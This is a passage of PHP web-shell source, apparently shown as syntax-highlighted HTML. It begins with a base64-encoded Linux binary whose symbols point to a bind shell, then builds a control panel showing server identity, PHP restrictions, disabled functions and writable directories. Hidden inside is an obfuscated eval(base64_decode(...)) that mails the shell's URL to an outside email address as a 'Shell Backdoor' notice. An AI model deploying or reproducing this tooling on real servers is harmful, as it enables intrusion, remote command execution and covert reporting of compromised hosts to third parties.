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QkFMX09GRlNFVF9UQUJMRV8AX19pbml0X2FycmF5X3N0YXJ0AGV4ZWNsQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAZm9ya0BAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfX2xpYmNfY3N1X2ZpbmkAYWNjZXB0QEBHTElCQ18yLjAAX2luaXQAbGlzdGVuQEBHTElCQ18yLjAAc2V0c29ja29wdEBAR0xJQkNfMi4wAF9zdGFydABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AGJpbmRAQEdMSUJDXzIuMABfZmluaQBleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AF9lbmQAc2VuZEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A&quot;</span><span class="p">;</span>
     
     
    <span class="nv">$safe_mode</span><span class="o">=</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;OFF&quot;</span><span class="o">:</span><span class="s2">&quot;ON&quot;</span><span class="p">;</span>
    <span class="nv">$open_basedir</span><span class="o">=</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;OFF&quot;</span><span class="o">:</span><span class="s2">&quot;ON&quot;</span><span class="p">;</span>
     
     
     
     <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;JHVybCA9ICghZW1wdHkoJF9TRVJWRVJbJ0hUVFBTJ10pKSA/ICJodHRwczovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10gOiAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQoNCiAkdG8gPSAiY2hpbXBweWFAZ21haWwuY29tIjsNCiAkc3ViamVjdCA9ICIkdXJsIjsNCiAkYm9keSA9ICJbK11TaGVsbCBMb2NhdGlvbjogJHVybFxuXG5bK10gLSAjU2hlbGwgQmFja2Rvb3IgIjsNCiBpZiAobWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSkpIHsNCiAgIGVjaG8oIiIpOw0KICB9IGVsc2Ugew0KICAgZWNobygiIik7DQogIH0=&#39;</span><span class="p">));</span>
    <span class="k">function</span> <span class="nf">srv_info</span><span class="p">(</span><span class="nv">$title</span><span class="p">,</span><span class="nv">$contents</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;</span><span class="si">$title</span><span class="s2">&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="si">$contents</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="nx">htmlhead</span><span class="p">(</span><span class="nv">$hsafemode</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table id=pagebar&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=fleft&amp;gt;</span><span class="si">$hsafemode</span><span class="s2">&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=fright&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;IP Address: &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">http://ws.arin.net/cgi-bin/whois.pl?queryinput=&quot;</span><span class="o">.@</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.@</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; &quot;</span><span class="o">.</span>
         <span class="s2">&quot;You: &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">http://ws.arin.net/cgi-bin/whois.pl?queryinput=&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; &quot;</span><span class="o">.</span>
         <span class="p">(</span><span class="nv">$win</span><span class="o">?</span><span class="s2">&quot;Drives: &quot;</span><span class="o">.</span><span class="nx">disp_drives</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$surl</span><span class="p">)</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td width=50%&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table class=info&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
     
    <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;System&quot;</span><span class="p">,</span><span class="nb">php_uname</span><span class="p">());</span>
    <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Software&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nv">$DISP_SERVER_SOFTWARE</span><span class="p">);</span>
    <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;ID&quot;</span><span class="p">,(</span><span class="nv">$win</span><span class="p">)</span> <span class="o">?</span> <span class="nb">get_current_user</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; (uid=&quot;</span><span class="o">.</span><span class="nb">getmyuid</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; gid=&quot;</span><span class="o">.</span><span class="nb">getmygid</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span> <span class="o">:</span> <span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">));</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/td&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;td width=50%&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table class=info&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Safe Mode&quot;</span><span class="p">,</span><span class="nv">$safe_mode</span><span class="p">);</span>  
    <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Open_Basedir&quot;</span><span class="p">,</span><span class="nv">$open_basedir</span><span class="p">);</span>
    <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Freespace&quot;</span><span class="p">,</span><span class="nx">disp_freespace</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">get_status</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$safemodeexecdir</span> <span class="o">?</span> <span class="s2">&quot;SafemodeExecDir: &quot;</span><span class="o">.</span><span class="nv">$safemodeexecdir</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">showdisfunc</span><span class="p">()</span> <span class="o">?</span> <span class="s2">&quot;Disabled Functions: &quot;</span><span class="o">.</span><span class="nx">showdisfunc</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2 id=mainmenu&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$quicklaunch2</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$quicklaunch2</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%d&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;..&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$a</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
          <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%upd&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$v</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2 id=mainmenu&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$quicklaunch1</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$quicklaunch1</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%d&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;..&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$a</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
          <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%upd&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$v</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td colspan=2&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;p class=fleft&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nv">$pd</span> <span class="o">=</span> <span class="nv">$e</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$pd</span> <span class="k">as</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$e</span> <span class="k">as</span> <span class="nv">$r</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$t</span><span class="o">.=</span> <span class="nv">$r</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">==</span> <span class="nv">$i</span><span class="p">)</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
        <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;font color=orange&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot; - &quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$wd</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
      <span class="nv">$wdt</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=#00FF00&amp;gt;[OK]&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
